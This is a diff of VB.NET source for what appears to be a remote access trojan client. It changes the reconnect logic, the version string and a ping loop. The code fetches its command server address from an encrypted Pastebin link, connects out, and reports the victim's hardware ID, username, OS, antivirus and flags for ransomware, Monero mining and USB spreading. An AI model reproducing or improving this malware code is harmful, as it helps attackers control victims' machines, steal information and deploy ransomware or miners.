@@ -70,22 +70,22 @@ e:      ' clear things and ReConnect
 
             Try
                 Dim WC As Net.WebClient = New Net.WebClient() 'Pastebin, split by ":" IP:PORT
-                Dim reply As String = WC.DownloadString(C_Encryption.AES_Decrypt(C_Settings.Pastebin))
-                C_Settings.HOST = reply.Split(":")(0)
-                C_Settings.PORT = reply.Split(":")(1)
-                WC.Dispose()
+                    Dim Response As String = WC.DownloadString(C_Encryption.AES_Decrypt(C_Settings.Pastebin))
+                    C_Settings.HOST = Response.Split(":")(0)
+                    C_Settings.PORT = Response.Split(":")(1)
+                    WC.Dispose()
             Catch ex As Exception
             End Try
 #End If
                 C.Client.Connect(C_Settings.HOST, C_Settings.PORT)
                 CNT = True
                 'Send info to server
-                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.2F", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
+                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.3", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
                                    C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, "...", SPL, " "))
                 Dim P As New Threading.Thread(AddressOf PING)
                 P.Start()
             Catch ex As Exception
-                Threading.Thread.Sleep(R.Next(5000))
+                Threading.Thread.Sleep(R.Next(10000))
                 GoTo e
             End Try
             GoTo re
@@ -112,21 +112,22 @@ e:      ' clear things and ReConnect
         Public Shared _start As Boolean = False
         Public Shared MS As Integer = 0
         Public Shared Sub PING(sock As Integer)
-re:
+
             Try
-                If CNT = False Then MS = 0 : Exit Sub
-                If _start Then
-                    MS += 1
-                    If _stop Then
-                        Send("!P" + SPL + MS.ToString)
-                        MS = 0
-                        _start = False
-                        _stop = False
+                While CNT = True
+                    If _start Then
+                        MS += 1
+                        If _stop Then
+                            Send("!P" + SPL + MS.ToString)
+                            MS = 0
+                            _start = False
+                            _stop = False
+                        End If
                     End If
-                End If
                     Threading.Thread.Sleep(1)
+                End While
+                MS = 0 : Exit Sub
             Catch : End Try
-            GoTo re
         End Sub
 
     End Class
